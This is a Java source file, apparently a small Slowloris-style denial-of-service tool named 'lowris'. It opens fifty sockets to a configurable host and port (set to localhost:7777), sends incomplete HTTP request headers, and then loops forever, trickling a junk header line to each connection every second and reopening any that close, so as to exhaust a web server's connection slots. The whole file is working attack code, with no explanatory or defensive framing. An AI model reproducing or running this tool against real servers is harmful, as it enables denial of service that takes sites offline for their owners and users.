package slow;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

public class lowris {
	static String host = "localhost";
	static int port = 7777;
	static Socket[] s = null;
	static int kn = 50;
	static String header = "Get / HTTP/1.1";
	static long time = 1000;
	static int timeout = 1000;

	public static void main(String[] args) {
		try {
			s = new Socket[kn];
			for (int i = 0; i < kn; i++) {
				s[i] = new Socket(host, port);
				s[i].setSoTimeout(timeout);
				s[i].setKeepAlive(true);
				start(s[i]);
			}
			while (true) {
				Thread.sleep(time);
				for (int i = 0; i < kn; i++) {

					if (!s[i].isInputShutdown()) {
						//System.out.println("www");
						slow(s[i]);
					} else {
						System.out.println("new connect");
						s[i] = new Socket(host, port);
						s[i].setSoTimeout(timeout);
						s[i].setKeepAlive(true);
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	static void start(Socket s) throws IOException {
		PrintWriter out = new PrintWriter(s.getOutputStream(), true);
		out.println(header);
		out.println((new StringBuilder("Host: ")).append(host).toString());
		out.print("Connection: Keep-Alive");
		out.print("Keep-Alive: 1000");
	}

	static void slow(Socket s) {
		try {

			PrintWriter out = new PrintWriter(s.getOutputStream(), true);
			out.println("sdsl-s-s-:saas");
			// System.out.println("s");
		} catch (IOException e) {
			// s = new Socket(host, port);
			e.printStackTrace();
		}

	}

	private static void send(Socket s, String host) throws IOException {
		PrintWriter out = new PrintWriter(s.getOutputStream(), true);
		out.println(header);
		out.println((new StringBuilder("Host: ")).append(host).toString());
		out.println("Connection: Keep-Alive");
		// out.println("X-a: b");

	}
}
